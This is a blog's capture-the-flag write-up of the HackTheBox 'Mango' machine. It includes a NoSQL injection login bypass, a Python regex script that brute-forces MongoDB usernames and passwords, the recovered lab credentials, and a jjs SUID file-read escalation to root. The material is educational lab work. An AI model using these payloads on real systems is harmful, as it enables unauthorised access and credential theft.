<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="This is a write-up of HackTheBox Mango. Contact me on Twitter (@ajdintrejic) if you have any questions
Reconnaissance Let’s run nmap,
sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there." />
<meta name="keywords" content=", Authentication bypass, MongoDB, NoSQL injection, jjs, SSL certificate" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://ajdintrejic.github.io/posts/2020/04/hackthebox-mango-write-up/" />


    <title>
        
            HackTheBox :: Mango Write Up :: ajdintrejic 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.753fac8f03736f0edc9be411eb20cee875dd7bb8e73c8155fbf6a629c863f4ca.css">


    
        <link rel="stylesheet" type="text/css" href="/css/textpadding.css">
    



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">



<meta itemprop="name" content="HackTheBox :: Mango Write Up">
<meta itemprop="description" content="This is a write-up of HackTheBox Mango. Contact me on Twitter (@ajdintrejic) if you have any questions
Reconnaissance Let’s run nmap,
sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there.">
<meta itemprop="datePublished" content="2020-04-18T13:28:11&#43;02:00" />
<meta itemprop="dateModified" content="2020-04-18T13:28:11&#43;02:00" />
<meta itemprop="wordCount" content="675">
<meta itemprop="image" content="https://ajdintrejic.github.io/"/>



<meta itemprop="keywords" content="Authentication bypass,MongoDB,NoSQL injection,jjs,SSL certificate," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://ajdintrejic.github.io/"/>

<meta name="twitter:title" content="HackTheBox :: Mango Write Up"/>
<meta name="twitter:description" content="This is a write-up of HackTheBox Mango. Contact me on Twitter (@ajdintrejic) if you have any questions
Reconnaissance Let’s run nmap,
sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there."/>





    <meta property="article:section" content="HackTheBox" />



    <meta property="article:published_time" content="2020-04-18 13:28:11 &#43;0200 CEST" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">ajdintrejic</span>
            <span class="logo__cursor" style=
                  "visibility:hidden;
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://ajdintrejic.github.io/about/">About</a></li><li><a href="https://ajdintrejic.github.io/categories/">Categories</a></li><li><a href="https://ajdintrejic.github.io/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>4 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title">
                <a href="https://ajdintrejic.github.io/posts/2020/04/hackthebox-mango-write-up/">HackTheBox :: Mango Write Up</a>
            </h1>
                <hr />
                <aside id="toc">
                <div class="toc-title">Table of Contents</div>
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconnaissance">Reconnaissance</a></li>
    <li><a href="#getting-user-account">Getting user account</a>
      <ul>
        <li><a href="#nosql-injection">NoSQL injection</a></li>
        <li><a href="#bruteforcing-the-password">Bruteforcing the password</a></li>
      </ul>
    </li>
    <li><a href="#getting-root-account">Getting root account</a>
      <ul>
        <li><a href="#privilege-escalation-with-jjs">Privilege escalation with JJS</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </aside>
                <hr />

            

            <div class="post-content">
                <p><img src="/htb-mango/mango_info_card.png" alt="infocard"></p>
<p>This is a write-up of HackTheBox Mango.
Contact me on Twitter (@ajdintrejic) if you have any questions</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>Let’s run nmap,</p>
<pre><code>sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
</code></pre><p><img src="/htb-mango/nmap_initial_results.png" alt="nmap"></p>
<p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
<p><img src="/htb-mango/mango_search_page.png" alt="page"></p>
<p><img src="/htb-mango/mango_analytics_page.png" alt="page"></p>
<h2 id="getting-user-account">Getting user account</h2>
<p>I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference:
staging-order.mango.htb</p>
<p><img src="/htb-mango/ssl_certificate.png" alt="ssl"></p>
<p>The page is inaccessible, but we can use the /etc/hosts file to redirect the page back to the server itself. You could also change the headers of the https request and change the host value to “staging-order.mango.htb”.</p>
<p>We have multiple server running on the same machine and port (Vhost - virtual hosts) so that is why when we change the host value, we access a “different” server.</p>
<p>Now I added the line to /etc/hosts so the hostname is translated to the correct IP address.</p>
<p><img src="/htb-mango/etc_hosts.png" alt="hosts"></p>
<h3 id="nosql-injection">NoSQL injection</h3>
<p>Now we have a login page here, I spent around 4 hours here as this wasn’t something I had experience with. We have to perform an authentication bypass.</p>
<p><img src="/htb-mango/login_mongodb.png" alt="login"></p>
<p>The login is handeld by MongoDB in the background. How do I know this? The full nmap scan has recognized a MongoDB instance. MondoDB is a NoSQL database, unlike PostgreSQL, which is an SQL database. We need to perform a NoSQL injection attack.</p>
<p>I opened the network tab in Firefox and tried to login with “admin” and “test”. This will send a POST request. We can open it and see the request body.</p>
<p><img src="/htb-mango/network_tab.png" alt="network"></p>
<p><img src="/htb-mango/request.png" alt="request"></p>
<p>Edit the request:</p>
<p>Before:</p>
<pre><code>username=admin&amp;password=test&amp;login=login
</code></pre><p>After:</p>
<pre><code>username=admin&amp;password[$ne]=test&amp;login=login
</code></pre><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
<p><img src="/htb-mango/request_reply.png" alt="reply"></p>
<p><img src="/htb-mango/after_login.png" alt="afterlogin"></p>
<h3 id="bruteforcing-the-password">Bruteforcing the password</h3>
<p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
<p>You should change the cookie ID.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">requests</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">stringurl</span> = <span style="color:#ed9d13">&#34;http://example.com&#34;</span>
headers = {<span style="color:#ed9d13">&#34;Host&#34;</span>: <span style="color:#ed9d13">&#34;exmaple.com&#34;</span>}
cookies = {<span style="color:#ed9d13">&#34;PHPSESSID&#34;</span>: <span style="color:#ed9d13">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
possible_chars = <span style="color:#24909d">list</span>(string.ascii_letters) + <span style="color:#24909d">list</span>(string.digits) + [<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">&#34;</span>+c <span style="color:#6ab825;font-weight:bold">for</span> c <span style="color:#6ab825;font-weight:bold">in</span> string.punctuation+string.whitespace ]<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_password</span>(username):
    <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;Extracting password of &#34;</span>+username)
    params = {<span style="color:#ed9d13">&#34;username&#34;</span>:username, <span style="color:#ed9d13">&#34;password[$regex]&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>, <span style="color:#ed9d13">&#34;login&#34;</span>: <span style="color:#ed9d13">&#34;login&#34;</span>}
    password = <span style="color:#ed9d13">&#34;^&#34;</span>
    <span style="color:#6ab825;font-weight:bold">while</span> True:
        <span style="color:#6ab825;font-weight:bold">for</span> c <span style="color:#6ab825;font-weight:bold">in</span> possible_chars:
            params[<span style="color:#ed9d13">&#34;password[$regex]&#34;</span>] = password + c + <span style="color:#ed9d13">&#34;.*&#34;</span>
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#24909d">int</span>(pr.status_code) == <span style="color:#3677a9">302</span>:
                password += c
                <span style="color:#6ab825;font-weight:bold">break</span>
        <span style="color:#6ab825;font-weight:bold">if</span> c == possible_chars[-<span style="color:#3677a9">1</span>]:
            <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;Found password &#34;</span>+password[<span style="color:#3677a9">1</span>:].replace(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#ed9d13">&#34;&#34;</span>)+<span style="color:#ed9d13">&#34; for username &#34;</span>+username)
            <span style="color:#6ab825;font-weight:bold">return</span> password[<span style="color:#3677a9">1</span>:].replace(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#ed9d13">&#34;&#34;</span>)<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_usernames</span>():
    usernames = []
    params = {<span style="color:#ed9d13">&#34;username[$regex]&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>, <span style="color:#ed9d13">&#34;password[$regex]&#34;</span>:<span style="color:#ed9d13">&#34;.*&#34;</span>, <span style="color:#ed9d13">&#34;login&#34;</span>: <span style="color:#ed9d13">&#34;login&#34;</span>}
    <span style="color:#6ab825;font-weight:bold">for</span> c <span style="color:#6ab825;font-weight:bold">in</span> possible_chars:
        username = <span style="color:#ed9d13">&#34;^&#34;</span> + c
        params[<span style="color:#ed9d13">&#34;username[$regex]&#34;</span>] = username + <span style="color:#ed9d13">&#34;.*&#34;</span>
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#24909d">int</span>(pr.status_code) == <span style="color:#3677a9">302</span>:
            <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;Found username starting with &#34;</span>+c)
            <span style="color:#6ab825;font-weight:bold">while</span> True:
                <span style="color:#6ab825;font-weight:bold">for</span> c2 <span style="color:#6ab825;font-weight:bold">in</span> possible_chars:
                    params[<span style="color:#ed9d13">&#34;username[$regex]&#34;</span>] = username + c2 + <span style="color:#ed9d13">&#34;.*&#34;</span>
                    <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#24909d">int</span>(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == <span style="color:#3677a9">302</span>:
                        username += c2
                        <span style="color:#6ab825;font-weight:bold">print</span>(username)
                        breakif c2 == possible_chars[-<span style="color:#3677a9">1</span>]:
                    <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#34;Found username: &#34;</span>+username[<span style="color:#3677a9">1</span>:])
                    usernames.append(username[<span style="color:#3677a9">1</span>:])
                    <span style="color:#6ab825;font-weight:bold">break</span>
    <span style="color:#6ab825;font-weight:bold">return</span> usernamesfor u <span style="color:#6ab825;font-weight:bold">in</span> get_usernames():
    get_password(u)
</code></pre></div><p>This will run for some time, the output is:</p>
<p><img src="/htb-mango/password_bruteforce.png" alt="success"></p>
<pre><code>admin:t9KcS3&gt;!0B#2
mango:h3mXK8RhU~f{]f5H
</code></pre><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
<p><img src="/htb-mango/user_txt.png" alt="usertxt"></p>
<h2 id="getting-root-account">Getting root account</h2>
<p>First, I switch from sh to bash by running /bin/bash.</p>
<p>I transfered linenum.sh on the server and checked the output. There was an interesting file with SUID bit set to 1:</p>
<p><img src="/htb-mango/jjs.png" alt="jjs"></p>
<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS</h3>
<p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
<pre><code>echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); var FileReader = Java.type(&quot;java.io.FileReader&quot;); var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); while ((line = br.readLine()) != null) { print(line); }' | jjs
</code></pre><p><img src="/htb-mango/root_txt.png" alt="roottxt"></p>
<p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://ajdintrejic.github.io/tags/authentication-bypass">Authentication bypass</a></span><span class="tag"><a href="https://ajdintrejic.github.io/tags/mongodb">MongoDB</a></span><span class="tag"><a href="https://ajdintrejic.github.io/tags/nosql-injection">NoSQL injection</a></span><span class="tag"><a href="https://ajdintrejic.github.io/tags/jjs">jjs</a></span><span class="tag"><a href="https://ajdintrejic.github.io/tags/ssl-certificate">SSL certificate</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>675 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-04-18 13:28 &#43;0200</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h"></span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    
                        <span class="button previous">
                            <a href="https://ajdintrejic.github.io/posts/2020/05/hackthebox-openadmin-write-up/">
                                <span class="button__icon">←</span>
                                <span class="button__text">HackTheBox :: Openadmin Write Up</span>
                            </a>
                        </span>
                    

                    
                        <span class="button next">
                            <a href="https://ajdintrejic.github.io/posts/2020/03/hackthebox-postman-write-up/">
                                <span class="button__text">HackTheBox :: Postman Write Up</span>
                                <span class="button__icon">→</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        
    </main>

            </div>

            
                <footer class="footer">
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.4a69500057d68129e88f497d354afe68422eb56de6d15e45dbe2190858ea5a76bfcb096406f992984b241db45f47388ac57ab0376e3b32125bef7a8a6d0f06c4.js" integrity="sha512-SmlQAFfWgSnoj0l9NUr&#43;aEIutW3m0V5F2&#43;IZCFjqWna/ywlkBvmSmEskHbRfRziKxXqwN247MhJb73qKbQ8GxA=="></script>
    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	if (window.sessionStorage) {
		var GA_SESSION_STORAGE_KEY = 'ga:clientId';
		ga('create', 'UA-165836726-1', {
	    'storage': 'none',
	    'clientId': sessionStorage.getItem(GA_SESSION_STORAGE_KEY)
	   });
	   ga(function(tracker) {
	    sessionStorage.setItem(GA_SESSION_STORAGE_KEY, tracker.get('clientId'));
	   });
   }
	ga('set', 'anonymizeIp', true);
	ga('send', 'pageview');
}
</script>




    </body>
</html>
